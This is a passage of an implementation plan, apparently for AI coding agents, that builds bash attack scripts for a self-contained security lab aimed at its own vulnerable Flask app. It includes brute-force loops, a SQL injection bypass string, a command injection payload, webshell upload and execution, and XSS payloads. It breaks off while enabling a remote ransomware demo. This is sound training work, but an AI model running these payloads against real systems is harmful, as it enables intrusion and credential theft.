# bait-n-break Phase 2 (Attacker Module) Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Build the Attacker (Kali) module for `bait-n-break`, per `docs/superpowers/specs/2026-07-15-bait-n-break-phase2-attacker-design.md`: menu-driven exploit scripts targeting the Phase 1 Victim node, a `TARGET_IP`/`TARGET_PORT`-threaded config, a "Run All Scenarios" kill-chain runner, and a results summary.

**Architecture:** Pure-bash attacker library functions (`bait_n_break/attacker/lib_*.sh`) driven by `bait_n_break/tui/attacker_console.sh` (replaces the Phase 1 placeholder), each wrapping a standard Kali tool where available with a hand-rolled bash+curl fallback. Two Phase 1 files (`victim/webapp/app.py`, `victim/webapp/docker-compose.yml`) get touched to make the ransomware demo remotely triggerable through the existing webshell.

**Tech Stack:** Bash (POSIX-ish), curl, optionally `nmap`/`hydra`/`sqlmap`/`sshpass` (installed best-effort by `setup.sh`, never required), Python/Flask (the one new route in the existing vulnerable web app).

## Global Constraints

- Every library file under `bait_n_break/attacker/` is a pure collection of functions, sourced not executed, and must NOT call `set -uo pipefail` or otherwise mutate shell options (only `run.sh`/`setup.sh`, which are directly executed, do that — this exact bug was caught and fixed repeatedly during Phase 1's review and must not recur).
- Every attack function checks `command -v <tool>` before deciding which code path (wrapped-tool vs hand-rolled fallback) to take. Absence of `nmap`/`hydra`/`sqlmap`/`sshpass` must never crash a scenario — it degrades to the fallback or reports `[FAILED]` with a clear reason, never a silent no-op.
- Every scenario function determines `[SUCCESS]`/`[FAILED]`/`[VULNERABLE]` from the actual HTTP/service response, tags an OPSEC risk (`loud` or `quiet`), and records exactly one line via `results_record()` — never writes to `.state/attack_results.txt` directly (mirrors Phase 1's "sole reader/writer" rule: `bait_n_break/attacker/lib_results.sh` owns that file).
- `TARGET_IP`/`TARGET_PORT` are read from `shared/config.sh`'s existing variables (already defined in Phase 1, unused until now) or prompted for via `attacker/lib_target.sh` if unset, then persisted through `shared/lib_state.sh` (extended in Task 1) so re-entering the Attacker Console doesn't re-prompt.
- Attack scenarios run with live terminal output (exit the whiptail/dialog chrome, run directly, `read` to pause, return to menu) — this is the opposite of Phase 1's `ui_msgbox`-snapshot pattern and is deliberate per the approved design.
- All weak credentials used by brute-force scripts are the exact same dummy values Phase 1 already seeded (`admin`/`admin123` for SSH/FTP/HTTP-admin) — never introduce new "real-looking" credentials.
- No automated test suite (per CLAUDE.md's Development process). Each task's verification is a syntax check plus a concrete manual command with expected output, actually run. Where a step is genuinely Docker-gated (the SSH/FTP decoy containers, or the two new victim-side routes which hardcode `/bait/...` container-internal paths), verify what's checkable without Docker (syntax, hand-rolled-fallback code path, local `python3 app.py` runs for anything HTTP-only) and clearly state what's deferred.
- Ransomware-demo remote trigger (`POST /admin/ransomware-demo` in `app.py`) must stay pure Python — no `subprocess`/shell-out to the host, no Docker socket — and must never touch anything outside `/bait/deception/ransomware_target/` inside the container, mirroring Phase 1's host-side confinement guarantee.

---

## Task 1: Shared state extensions + attacker results library

**Files:**
- Modify: `bait_n_break/shared/config.sh` (add two path constants)
- Modify: `bait_n_break/shared/lib_state.sh` (add two functions)
- Create: `bait_n_break/attacker/lib_results.sh`

**Interfaces:**
- Consumes: existing `BNB_STATE_DIR` (Phase 1).
- Produces (consumed by Task 2 and Task 9): `BNB_ATTACK_RESULTS`, `BNB_TARGET_FILE` (config.sh); `state_set_target(ip, port)`, `state_get_target()` (lib_state.sh); `results_init()`, `results_record(scenario, verdict, opsec, detail)`, `results_summary()`, `results_clear()` (lib_results.sh).

- [ ] **Step 1: Add two path constants to `bait_n_break/shared/config.sh`**

Add these two lines right after the existing `BNB_BAIT_ACCESS_LOG="${BNB_STATE_DIR}/bait_access.log"` line:

```bash
BNB_ATTACK_RESULTS="${BNB_STATE_DIR}/attack_results.txt"
BNB_TARGET_FILE="${BNB_STATE_DIR}/attacker_target"
```

- [ ] **Step 2: Add two functions to `bait_n_break/shared/lib_state.sh`**

Add these two functions right after the existing `state_bait_marker_files_since()` function and before `state_reset()`:

```bash
state_set_target() {
    printf '%s %s\n' "$1" "$2" > "${BNB_TARGET_FILE}"
}

state_get_target() {
    [ -f "${BNB_TARGET_FILE}" ] && cat "${BNB_TARGET_FILE}"
}
```

Also update `state_init()` to touch the new files, and `state_reset()` to remove them, so they follow the same lifecycle as every other `.state/*` file:

```bash
state_init() {
    mkdir -p "${BNB_STATE_DIR}" "${BNB_BAIT_BACKUPS_DIR}" "${BNB_BAIT_SECRETS_DIR}" "${BNB_BAIT_DECEPTION_DIR}"
    touch "${BNB_STATE_FILE}" "${BNB_BAIT_MANIFEST}" "${BNB_INCIDENT_LOG}" "${BNB_BAIT_ACCESS_LOG}" "${BNB_ATTACK_RESULTS}" "${BNB_TARGET_FILE}"
}
```

```bash
state_reset() {
    rm -f "${BNB_STATE_FILE}" "${BNB_BAIT_MANIFEST}" "${BNB_INCIDENT_LOG}" "${BNB_BAIT_ACCESS_LOG}" "${BNB_ATTACK_RESULTS}" "${BNB_TARGET_FILE}"
    rm -rf "${BNB_BAIT_BACKUPS_DIR}" "${BNB_BAIT_SECRETS_DIR}" "${BNB_BAIT_DECEPTION_DIR}"
    state_init
}
```

(Only the `touch`/`rm -f` argument lists change — everything else in `state_init`/`state_reset` stays exactly as Phase 1 left it.)

- [ ] **Step 3: Write `bait_n_break/attacker/lib_results.sh`**

```bash
#!/usr/bin/env bash
# Sole reader/writer of .state/attack_results.txt. Other attacker modules
# must not touch that file directly - they call these functions instead.
# Sourced, not executed - deliberately does not set shell options (see
# shared/config.sh for why).

results_init() {
    touch "${BNB_ATTACK_RESULTS}"
}

results_record() {
    # $1=scenario $2=verdict(SUCCESS|FAILED|VULNERABLE) $3=opsec(loud|quiet) $4=detail
    local ts
    ts="$(date '+%Y-%m-%d %H:%M:%S')"
    echo "[${ts}] [$1] [$2] [OPSEC:$3] $4" >> "${BNB_ATTACK_RESULTS}"
}

results_summary() {
    [ -f "${BNB_ATTACK_RESULTS}" ] && cat "${BNB_ATTACK_RESULTS}"
}

results_clear() {
    : > "${BNB_ATTACK_RESULTS}"
}
```

- [ ] **Step 4: Syntax-check all three files**

Run: `bash -n bait_n_break/shared/config.sh && bash -n bait_n_break/shared/lib_state.sh && bash -n bait_n_break/attacker/lib_results.sh`
Expected: no output, exit code 0.

- [ ] **Step 5: Manually verify target persistence and results round-trip, in a scratch state dir**

```bash
bash -c '
export BNB_ROOT="$(mktemp -d)"
source bait_n_break/shared/config.sh
source bait_n_break/shared/lib_state.sh
source bait_n_break/attacker/lib_results.sh
state_init
state_set_target "192.0.2.10" "8080"
echo "target=$(state_get_target)"
results_record "recon" "SUCCESS" "quiet" "scan completed"
results_record "bruteforce_ssh" "FAILED" "loud" "no working credentials found"
echo "--- summary ---"
results_summary
results_clear
echo "summary_after_clear=[$(results_summary)]"
'
```
Expected: `target=192.0.2.10 8080`, then two lines under `--- summary ---` containing `[recon] [SUCCESS] [OPSEC:quiet] scan completed` and `[bruteforce_ssh] [FAILED] [OPSEC:loud] no working credentials found`, then `summary_after_clear=[]`.

- [ ] **Step 6: Commit**

```bash
git add bait_n_break/shared/config.sh bait_n_break/shared/lib_state.sh bait_n_break/attacker/lib_results.sh
git commit -m "Add attacker results tracking and target-state persistence"
```

---

## Task 2: Target configuration library

**Files:**
- Create: `bait_n_break/attacker/lib_target.sh`

**Interfaces:**
- Consumes: `TARGET_IP`/`TARGET_PORT` (Phase 1 `config.sh`, currently unused defaults); `state_set_target()`, `state_get_target()` (Task 1); `ui_error()`, `ui_msgbox()` (Phase 1 `lib_ui.sh`).
- Produces (consumed by every attacker/lib_*.sh module in Tasks 4-8, and Task 9): `target_prompt()`, `target_ensure_set()`.

- [ ] **Step 1: Write `bait_n_break/attacker/lib_target.sh`**

```bash
#!/usr/bin/env bash
# Prompts for and validates TARGET_IP/TARGET_PORT, persists via lib_state.sh,
# and exports them into the current shell so attacker/lib_*.sh functions can
# use $TARGET_IP/$TARGET_PORT directly.
# Sourced, not executed - deliberately does not set shell options (see
# shared/config.sh for why).

target_is_valid_ip() {
    local ip="$1"
    [[ "$ip" =~ ^([0-9]{1,3}\.){3}[0-9]{1,3}$ ]] || return 1
    local IFS=.
    local -a octets=($ip)
    local o
    for o in "${octets[@]}"; do
        [ "$o" -ge 0 ] && [ "$o" -le 255 ] || return 1
    done
    return 0
}

target_is_valid_port() {
    local port="$1"
    [[ "$port" =~ ^[0-9]+$ ]] || return 1
    [ "$port" -ge 1 ] && [ "$port" -le 65535 ]
}

target_prompt() {
    local ip port
    read -r -p "Target IP [${TARGET_IP:-required}]: " ip
    ip="${ip:-${TARGET_IP:-}}"
    if ! target_is_valid_ip "$ip"; then
        ui_error "Invalid Target" "\"$ip\" is not a valid IPv4 address."
        return 1
    fi
    read -r -p "Target Port [${TARGET_PORT:-8080}]: " port
    port="${port:-${TARGET_PORT:-8080}}"
    if ! target_is_valid_port "$port"; then
        ui_error "Invalid Target" "\"$port\" is not a valid port number."
        return 1
    fi
    TARGET_IP="$ip"
    TARGET_PORT="$port"
    state_set_target "$TARGET_IP" "$TARGET_PORT"
    ui_msgbox "Target Set" "Target configured: ${TARGET_IP}:${TARGET_PORT}"
}

target_ensure_set() {
    if [ -z "${TARGET_IP:-}" ]; then
        local saved
        saved="$(state_get_target)"
        if [ -n "$saved" ]; then
            TARGET_IP="$(echo "$saved" | cut -d' ' -f1)"
            TARGET_PORT="$(echo "$saved" | cut -d' ' -f2)"
        fi
    fi
    if [ -z "${TARGET_IP:-}" ]; then
        target_prompt
    fi
    [ -n "${TARGET_IP:-}" ]
}
```

- [ ] **Step 2: Syntax-check**

Run: `bash -n bait_n_break/attacker/lib_target.sh`
Expected: no output, exit code 0.

- [ ] **Step 3: Manually verify IP/port validation and persistence, in a scratch state dir**

```bash
bash -c '
export BNB_ROOT="$(mktemp -d)"
source bait_n_break/shared/config.sh
source bait_n_break/shared/lib_ui.sh
source bait_n_break/shared/lib_state.sh
source bait_n_break/attacker/lib_target.sh
state_init

target_is_valid_ip "192.168.1.1" && echo "valid_ip_ok"
target_is_valid_ip "999.1.1.1" || echo "invalid_ip_rejected_ok"
target_is_valid_port "8080" && echo "valid_port_ok"
target_is_valid_port "70000" || echo "invalid_port_rejected_ok"

printf "10.0.0.5\n9999\n" | target_prompt
echo "state=$(state_get_target)"

unset TARGET_IP TARGET_PORT
target_ensure_set
echo "loaded_from_state: TARGET_IP=$TARGET_IP TARGET_PORT=$TARGET_PORT"
'
```
Expected: `valid_ip_ok`, `invalid_ip_rejected_ok`, `valid_port_ok`, `invalid_port_rejected_ok`, then a "Target Set" msgbox (plain-mode prints it and waits for Enter — pipe won't provide one, so redirect: append `</dev/null` is not needed since `read -r -p "Press Enter..."` isn't called by `target_prompt` itself, only `ui_msgbox` which in plain mode does `read -r -p "Press Enter to continue..." _` - since stdin is already exhausted by the printf pipe, this read will return immediately with empty input, which is fine), `state=10.0.0.5 9999`, and finally `loaded_from_state: TARGET_IP=10.0.0.5 TARGET_PORT=9999`.

- [ ] **Step 4: Commit**

```bash
git add bait_n_break/attacker/lib_target.sh
git commit -m "Add attacker target configuration library"
```

---

## Task 3: Crawler + wordlist

**Files:**
- Create: `bait_n_break/attacker/wordlists/common_paths.txt`
- Create: `bait_n_break/attacker/lib_crawler.sh`

**Interfaces:**
- Consumes: `target_ensure_set()` (Task 2); `results_record()` (Task 1); `BNB_ROOT` (Phase 1).
- Produces (consumed by Task 9): `crawl_leaked_files()`.

- [ ] **Step 1: Write `bait_n_break/attacker/wordlists/common_paths.txt`**

```
/admin
/admin/
/files/backups/
/files/secrets/
/files/deception/
/backups/
/secrets/
/uploads/
/.env
/robots.txt
/config.php
/db_backup.sql
/wp-config.php
/.git/config
/old_site.zip
```

- [ ] **Step 2: Write `bait_n_break/attacker/lib_crawler.sh`**

```bash
#!/usr/bin/env bash
# Leaked-file crawler: iterates a wordlist of candidate paths against the
# target, and for any directory-listing page it finds, also enumerates and
# reports the files listed inside it. Real bait paths are mixed among
# plausible decoy paths in the wordlist, so this has to actually search.
# Sourced, not executed - deliberately does not set shell options (see
# shared/config.sh for why).

crawl_leaked_files() {
    target_ensure_set || { echo "[crawler] No target set."; return 1; }
    local base="http://${TARGET_IP}:${TARGET_PORT}"
    local wordlist="${BNB_ROOT}/bait_n_break/attacker/wordlists/common_paths.txt"
    local body_file found=0
    body_file="$(mktemp)"
    echo "=== Crawling ${base} for leaked files ==="
    while IFS= read -r path; do
        [ -z "$path" ] && continue
        local url="${base}${path}"
        local code
        code="$(curl -s -o "$body_file" -w '%{http_code}' "$url")"
        if [ "$code" = "200" ]; then
            echo "[FOUND] ${path}"
            found=$((found + 1))
            if [[ "$path" == /files/*/ ]]; then
                grep -oE "href='[^']+'" "$body_file" | sed -E "s/^href='//;s/'\$//" | while IFS= read -r link; do
                    echo "    -> ${base}${link}"
                done
            fi
        fi
    done < "$wordlist"
    rm -f "$body_file"
    echo "=== Crawl complete: ${found} path(s) found ==="
    if [ "$found" -gt 0 ]; then
        results_record "crawler" "VULNERABLE" "quiet" "${found} leaked path(s) found via wordlist"
    else
        results_record "crawler" "FAILED" "quiet" "no leaked paths found via wordlist"
    fi
}
```

- [ ] **Step 3: Syntax-check**

Run: `bash -n bait_n_break/attacker/lib_crawler.sh`
Expected: no output, exit code 0.

- [ ] **Step 4: Manually verify against a locally-run copy of the vulnerable app (no Docker needed)**

```bash
cd bait_n_break/victim/webapp
pip install -r requirements.txt --quiet
python3 app.py &
sleep 1
cd - >/dev/null

bash -c '
export BNB_ROOT="$(pwd)"
export TARGET_IP="127.0.0.1"
export TARGET_PORT="5000"
source bait_n_break/shared/config.sh
source bait_n_break/shared/lib_ui.sh
source bait_n_break/shared/lib_state.sh
source bait_n_break/attacker/lib_target.sh
source bait_n_break/attacker/lib_results.sh
source bait_n_break/attacker/lib_crawler.sh
state_init
crawl_leaked_files
results_summary
'
kill %1
```
Expected: at least `/admin`, `/admin/`, and one or more of `/files/backups/`, `/files/secrets/`, `/files/deception/` reported as `[FOUND]` (the app has bait files mounted at `/bait/*` only inside Docker, so on a bare local run without Docker the `/files/<area>/` routes will 404 since `os.path.isdir(directory)` fails for the container-only `/bait/...` paths - note in the report whether they showed FOUND or not; `/admin` and `/admin/` should still be FOUND either way since that route doesn't depend on `/bait/*` existing), and the results summary contains a `[crawler]` line.

- [ ] **Step 5: Commit**

```bash
git add bait_n_break/attacker/wordlists/common_paths.txt bait_n_break/attacker/lib_crawler.sh
git commit -m "Add leaked-file crawler and path wordlist"
```

---

## Task 4: Reconnaissance module

**Files:**
- Create: `bait_n_break/attacker/lib_recon.sh`

**Interfaces:**
- Consumes: `target_ensure_set()` (Task 2); `results_record()` (Task 1).
- Produces (consumed by Task 9): `recon_scan()`.

- [ ] **Step 1: Write `bait_n_break/attacker/lib_recon.sh`**

```bash
#!/usr/bin/env bash
# Reconnaissance: port/service scan against TARGET_IP. Uses nmap if
# available, else a hand-rolled /dev/tcp probe + curl banner grab.
# Sourced, not executed - deliberately does not set shell options (see
# shared/config.sh for why).

recon_probe_port() {
    local host="$1" port="$2"
    (exec 3<>"/dev/tcp/${host}/${port}") 2>/dev/null
    local rc=$?
    exec 3<&- 2>/dev/null
    exec 3>&- 2>/dev/null
    return "$rc"
}

recon_scan() {
    target_ensure_set || { echo "[recon] No target set."; return 1; }
    echo "=== Recon scan against ${TARGET_IP} ==="
    local open=0
    if command -v nmap >/dev/null 2>&1; then
        nmap -sV -p "22,21,${TARGET_PORT}" "${TARGET_IP}"
        open=1
    else
        echo "(nmap not found, using fallback port probe)"
        local port
        for port in 22 21 "${TARGET_PORT}"; do
            if recon_probe_port "${TARGET_IP}" "${port}"; then
                echo "[OPEN] ${TARGET_IP}:${port}"
                open=$((open + 1))
            else
                echo "[CLOSED] ${TARGET_IP}:${port}"
            fi
        done
        echo "--- HTTP banner ---"
        curl -s -I "http://${TARGET_IP}:${TARGET_PORT}/" 2>/dev/null | head -5
    fi
    if [ "$open" -gt 0 ]; then
        results_record "recon" "SUCCESS" "quiet" "scan completed against ${TARGET_IP}"
    else
        results_record "recon" "FAILED" "quiet" "no open ports found against ${TARGET_IP}"
    fi
}
```

- [ ] **Step 2: Syntax-check**

Run: `bash -n bait_n_break/attacker/lib_recon.sh`
Expected: no output, exit code 0.

- [ ] **Step 3: Manually verify the fallback path against a locally-run copy of the vulnerable app**

```bash
cd bait_n_break/victim/webapp
python3 app.py &
sleep 1
cd - >/dev/null

bash -c '
export BNB_ROOT="$(pwd)"
export TARGET_IP="127.0.0.1"
export TARGET_PORT="5000"
source bait_n_break/shared/config.sh
source bait_n_break/shared/lib_ui.sh
source bait_n_break/shared/lib_state.sh
source bait_n_break/attacker/lib_target.sh
source bait_n_break/attacker/lib_results.sh
source bait_n_break/attacker/lib_recon.sh
state_init
recon_scan
results_summary
'
kill %1
```
Expected: `[OPEN] 127.0.0.1:5000` (port 22/21 will show `[CLOSED]` unless something else happens to be listening on this machine - that's fine and expected), an HTTP banner block, and a `[recon] [SUCCESS]` line in the results summary. If `nmap` happens to be installed in this environment, note that the primary path ran instead and that's fine too - just confirm it doesn't error.

- [ ] **Step 4: Commit**

```bash
git add bait_n_break/attacker/lib_recon.sh
git commit -m "Add reconnaissance module"
```

---

## Task 5: Brute-force module

**Files:**
- Create: `bait_n_break/attacker/lib_bruteforce.sh`

**Interfaces:**
- Consumes: `target_ensure_set()` (Task 2); `results_record()` (Task 1); the Phase 1 `/login` route and the Phase 2 SSH/FTP decoy containers (ports 2222/2121, `admin`/`admin123`).
- Produces (consumed by Task 9): `bruteforce_ssh()`, `bruteforce_ftp()`, `bruteforce_http()`.

- [ ] **Step 1: Write `bait_n_break/attacker/lib_bruteforce.sh`**

```bash
#!/usr/bin/env bash
# Weak-credential brute force against SSH/FTP/HTTP-basic. Uses hydra if
# available, else a hand-rolled loop over a small built-in credential list
# matching the exact dummy credentials Phase 1 seeded.
# Sourced, not executed - deliberately does not set shell options (see
# shared/config.sh for why).

BNB_BRUTEFORCE_CREDS=(
    "admin:admin123"
    "admin:admin"
    "root:toor"
    "admin:password"
)

bruteforce_ssh() {
    target_ensure_set || { echo "[bruteforce-ssh] No target set."; return 1; }
    echo "=== SSH brute force against ${TARGET_IP}:2222 ==="
    local found="" cred user pass
    if command -v hydra >/dev/null 2>&1; then
        local userlist passlist
        userlist="$(mktemp)"; passlist="$(mktemp)"
        printf '%s\n' "${BNB_BRUTEFORCE_CREDS[@]}" | cut -d: -f1 | sort -u > "$userlist"
        printf '%s\n' "${BNB_BRUTEFORCE_CREDS[@]}" | cut -d: -f2 | sort -u > "$passlist"
        hydra -L "$userlist" -P "$passlist" -s 2222 "${TARGET_IP}" ssh
        rm -f "$userlist" "$passlist"
    else
        echo "(hydra not found, using fallback credential loop)"
        if ! command -v sshpass >/dev/null 2>&1; then
            echo "(sshpass also not found - cannot attempt SSH login without it)"
            results_record "bruteforce_ssh" "FAILED" "loud" "no hydra/sshpass available"
            return 1
        fi
        for cred in "${BNB_BRUTEFORCE_CREDS[@]}"; do
            user="${cred%%:*}"; pass="${cred##*:}"
            if sshpass -p "$pass" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=3 -p 2222 "${user}@${TARGET_IP}" true 2>/dev/null; then
                echo "[SUCCESS] ${user}:${pass}"
                found="${user}:${pass}"
                break
            else
                echo "[FAILED] ${user}:${pass}"
            fi
        done
    fi
    if [ -n "$found" ]; then
        results_record "bruteforce_ssh" "SUCCESS" "loud" "credentials found: ${found}"
    else
        results_record "bruteforce_ssh" "FAILED" "loud" "no working credentials found"
    fi
}

bruteforce_ftp() {
    target_ensure_set || { echo "[bruteforce-ftp] No target set."; return 1; }
    echo "=== FTP brute force against ${TARGET_IP}:2121 ==="
    local found="" cred user pass
    if command -v hydra >/dev/null 2>&1; then
        local userlist passlist
        userlist="$(mktemp)"; passlist="$(mktemp)"
        printf '%s\n' "${BNB_BRUTEFORCE_CREDS[@]}" | cut -d: -f1 | sort -u > "$userlist"
        printf '%s\n' "${BNB_BRUTEFORCE_CREDS[@]}" | cut -d: -f2 | sort -u > "$passlist"
        hydra -L "$userlist" -P "$passlist" -s 2121 "${TARGET_IP}" ftp
        rm -f "$userlist" "$passlist"
    else
        echo "(hydra not found, using fallback credential loop)"
        for cred in "${BNB_BRUTEFORCE_CREDS[@]}"; do
            user="${cred%%:*}"; pass="${cred##*:}"
            if curl -s --connect-timeout 3 "ftp://${user}:${pass}@${TARGET_IP}:2121/" -o /dev/null; then
                echo "[SUCCESS] ${user}:${pass}"
                found="${user}:${pass}"
                break
            else
                echo "[FAILED] ${user}:${pass}"
            fi
        done
    fi
    if [ -n "$found" ]; then
        results_record "bruteforce_ftp" "SUCCESS" "loud" "credentials found: ${found}"
    else
        results_record "bruteforce_ftp" "FAILED" "loud" "no working credentials found"
    fi
}

bruteforce_http() {
    target_ensure_set || { echo "[bruteforce-http] No target set."; return 1; }
    echo "=== HTTP login brute force against ${TARGET_IP}:${TARGET_PORT}/login ==="
    local found="" cred user pass code
    for cred in "${BNB_BRUTEFORCE_CREDS[@]}"; do
        user="${cred%%:*}"; pass="${cred##*:}"
        code="$(curl -s -o /dev/null -w '%{http_code}' -X POST "http://${TARGET_IP}:${TARGET_PORT}/login" -d "username=${user}&password=${pass}")"
        if [ "$code" = "200" ]; then
            echo "[SUCCESS] ${user}:${pass}"
            found="${user}:${pass}"
            break
        else
            echo "[FAILED] ${user}:${pass} (HTTP ${code})"
        fi
    done
    if [ -n "$found" ]; then
        results_record "bruteforce_http" "SUCCESS" "loud" "credentials found: ${found}"
    else
        results_record "bruteforce_http" "FAILED" "loud" "no working credentials found"
    fi
}
```

- [ ] **Step 2: Syntax-check**

Run: `bash -n bait_n_break/attacker/lib_bruteforce.sh`
Expected: no output, exit code 0.

- [ ] **Step 3: Manually verify `bruteforce_http` against a locally-run copy of the vulnerable app (this one doesn't need Docker/SSH/FTP)**

```bash
cd bait_n_break/victim/webapp
python3 app.py &
sleep 1
cd - >/dev/null

bash -c '
export BNB_ROOT="$(pwd)"
export TARGET_IP="127.0.0.1"
export TARGET_PORT="5000"
source bait_n_break/shared/config.sh
source bait_n_break/shared/lib_ui.sh
source bait_n_break/shared/lib_state.sh
source bait_n_break/attacker/lib_target.sh
source bait_n_break/attacker/lib_results.sh
source bait_n_break/attacker/lib_bruteforce.sh
state_init
bruteforce_http
results_summary
'
kill %1
```
Expected: `[SUCCESS] admin:admin123` on the first credential (the app's seeded user is exactly `admin`/`admin123`), and a `[bruteforce_http] [SUCCESS]` line in the results summary.

- [ ] **Step 4: Verify `bruteforce_ssh`/`bruteforce_ftp`'s fallback code paths don't error out with no target reachable**

```bash
bash -c '
export BNB_ROOT="$(pwd)"
export TARGET_IP="192.0.2.1"
export TARGET_PORT="8080"
source bait_n_break/shared/config.sh
source bait_n_break/shared/lib_ui.sh
source bait_n_break/shared/lib_state.sh
source bait_n_break/attacker/lib_target.sh
source bait_n_break/attacker/lib_results.sh
source bait_n_break/attacker/lib_bruteforce.sh
state_init
bruteforce_ssh
bruteforce_ftp
results_summary
'
```
Expected: both functions run to completion without crashing (using the unreachable `192.0.2.1` TEST-NET address so nothing actually connects), each ending in a `[FAILED]` result line. Note in the report whether `hydra`/`sshpass` were present in this environment and which code path actually ran. This is the extent of verification possible without Docker's SSH/FTP decoy containers - full live-credential verification is deferred to a Docker-capable environment.

- [ ] **Step 5: Commit**

```bash
git add bait_n_break/attacker/lib_bruteforce.sh
git commit -m "Add brute-force module"
```

---

## Task 6: Web exploitation module

**Files:**
- Create: `bait_n_break/attacker/lib_web_exploit.sh`

**Interfaces:**
- Consumes: `target_ensure_set()` (Task 2); `results_record()` (Task 1); the Phase 1 `/login`, `/ping`, `/upload`, `/shell/<filename>`, `/search`, `/comments` routes.
- Produces (consumed by Task 9): `exploit_sqli()`, `exploit_command_injection()`, `exploit_webshell_deploy()`, `exploit_xss_poc()`.

- [ ] **Step 1: Write `bait_n_break/attacker/lib_web_exploit.sh`**

```bash
#!/usr/bin/env bash
# Web exploitation: SQL injection auth bypass, command injection, webshell
# deploy via unrestricted upload, and XSS proof-of-concept.
# Sourced, not executed - deliberately does not set shell options (see
# shared/config.sh for why).

exploit_sqli() {
    target_ensure_set || { echo "[sqli] No target set."; return 1; }
    local base="http://${TARGET_IP}:${TARGET_PORT}"
    echo "=== SQL injection auth bypass against ${base}/login ==="
    local body
    if command -v sqlmap >/dev/null 2>&1; then
        sqlmap --batch -u "${base}/login" --data="username=admin&password=x" -p username --level 2
        results_record "exploit_sqli" "VULNERABLE" "quiet" "sqlmap run against ${base}/login"
        return 0
    fi
    echo "(sqlmap not found, using hand-rolled payload)"
    body="$(curl -s -X POST "${base}/login" -d "username=' OR '1'='1'--&password=x")"
    echo "$body"
    if echo "$body" | grep -q "Welcome"; then
        results_record "exploit_sqli" "VULNERABLE" "quiet" "auth bypass succeeded with ' OR '1'='1'--"
    else
        results_record "exploit_sqli" "FAILED" "quiet" "auth bypass payload did not succeed"
    fi
}

exploit_command_injection() {
    target_ensure_set || { echo "[cmdi] No target set."; return 1; }
    local base="http://${TARGET_IP}:${TARGET_PORT}"
    echo "=== Command injection against ${base}/ping ==="
    local body
    body="$(curl -s "${base}/ping?host=127.0.0.1;id")"
    echo "$body"
    if echo "$body" | grep -qE "uid=[0-9]+"; then
        results_record "exploit_command_injection" "VULNERABLE" "loud" "injected 'id' command executed"
    else
        results_record "exploit_command_injection" "FAILED" "loud" "injection did not confirm command execution"
    fi
}

exploit_webshell_deploy() {
    target_ensure_set || { echo "[webshell] No target set."; return 1; }
    local base="http://${TARGET_IP}:${TARGET_PORT}"
    echo "=== Webshell deploy against ${base}/upload ==="
    local shell_file body filename shell_out
    shell_file="$(mktemp --suffix=.sh)"
    printf '#!/bin/bash\nid\necho "arg: $1"\n' > "$shell_file"
    filename="$(basename "$shell_file")"
    body="$(curl -s -F "file=@${shell_file}" "${base}/upload")"
    echo "$body"
    rm -f "$shell_file"
    shell_out="$(curl -s "${base}/shell/${filename}?cmd=whoami")"
    echo "$shell_out"
    if echo "$shell_out" | grep -qE "uid=[0-9]+"; then
        results_record "exploit_webshell_deploy" "VULNERABLE" "loud" "uploaded and executed ${filename} via /shell"
    else
        results_record "exploit_webshell_deploy" "FAILED" "loud" "upload or execution did not succeed"
    fi
}

exploit_xss_poc() {
    target_ensure_set || { echo "[xss] No target set."; return 1; }
    local base="http://${TARGET_IP}:${TARGET_PORT}"
    local payload='<script>alert(1)</script>'
    local body
    echo "=== Reflected XSS PoC against ${base}/search ==="
    body="$(curl -s -G "${base}/search" --data-urlencode "q=${payload}")"
    if echo "$body" | grep -qF "$payload"; then
        echo "[VULNERABLE] Reflected XSS: payload echoed unescaped"
        results_record "exploit_xss_reflected" "VULNERABLE" "quiet" "payload reflected unescaped in /search"
    else
        echo "[FAILED] Reflected XSS payload not found unescaped"
        results_record "exploit_xss_reflected" "FAILED" "quiet" "payload not reflected"
    fi
    echo "=== Stored XSS PoC against ${base}/comments ==="
    curl -s -X POST "${base}/comments" -d "author=attacker&body=${payload}" -o /dev/null
    body="$(curl -s "${base}/comments")"
    if echo "$body" | grep -qF "$payload"; then
        echo "[VULNERABLE] Stored XSS: payload persisted and echoed unescaped"
        results_record "exploit_xss_stored" "VULNERABLE" "loud" "payload stored and reflected unescaped in /comments"
    else
        echo "[FAILED] Stored XSS payload not found"
        results_record "exploit_xss_stored" "FAILED" "loud" "payload not stored/reflected"
    fi
}
```

- [ ] **Step 2: Syntax-check**

Run: `bash -n bait_n_break/attacker/lib_web_exploit.sh`
Expected: no output, exit code 0.

- [ ] **Step 3: Manually verify all four functions against a locally-run copy of the vulnerable app (no Docker needed - every route these functions hit is pure Flask logic, not container-path-dependent)**

```bash
cd bait_n_break/victim/webapp
python3 app.py &
sleep 1
cd - >/dev/null

bash -c '
export BNB_ROOT="$(pwd)"
export TARGET_IP="127.0.0.1"
export TARGET_PORT="5000"
source bait_n_break/shared/config.sh
source bait_n_break/shared/lib_ui.sh
source bait_n_break/shared/lib_state.sh
source bait_n_break/attacker/lib_target.sh
source bait_n_break/attacker/lib_results.sh
source bait_n_break/attacker/lib_web_exploit.sh
state_init
exploit_sqli
exploit_command_injection
exploit_webshell_deploy
exploit_xss_poc
echo "--- summary ---"
results_summary
'
kill %1
```
Expected: `exploit_sqli` prints a page containing "Welcome, admin" and records `VULNERABLE`; `exploit_command_injection` prints output containing `uid=` (or the ping fallback output plus the injected `id` output) and records `VULNERABLE` (note: on a machine without a real `ping`/`id` binary in the exact expected shape this could differ - report the actual output either way); `exploit_webshell_deploy` prints an upload confirmation then the executed `whoami`/`id` output and records `VULNERABLE`; `exploit_xss_poc` reports both reflected and stored `VULNERABLE`. All four should show up in the results summary.

- [ ] **Step 4: Commit**

```bash
git add bait_n_break/attacker/lib_web_exploit.sh
git commit -m "Add web exploitation module"
```

---

## Task 7: Victim-side remote ransomware-demo trigger

**Files:**
- Modify: `bait_n_break/victim/webapp/docker-compose.yml`
- Modify: `bait_n_break/victim/webapp/app.py`

**Interfaces:**
- Consumes: existing `BAIT_AREAS["deception"]` path convention (Phase 1 `app.py`).
- Produces (consumed by Task 8): a `POST /admin/ransomware-demo` route reachable at `http://<TARGET_IP>:<TARGET_PORT>/admin/ransomware-demo`.

- [ ] **Step 1: Modify `bait_n_break/victim/webapp/docker-compose.yml`**

Change this line (in the `webapp` service's `volumes:` block):

```yaml
      - ../../../.state/bait/deception:/bait/deception:ro
```

to:

```yaml
      - ../../../.state/bait/deception:/bait/deception
```

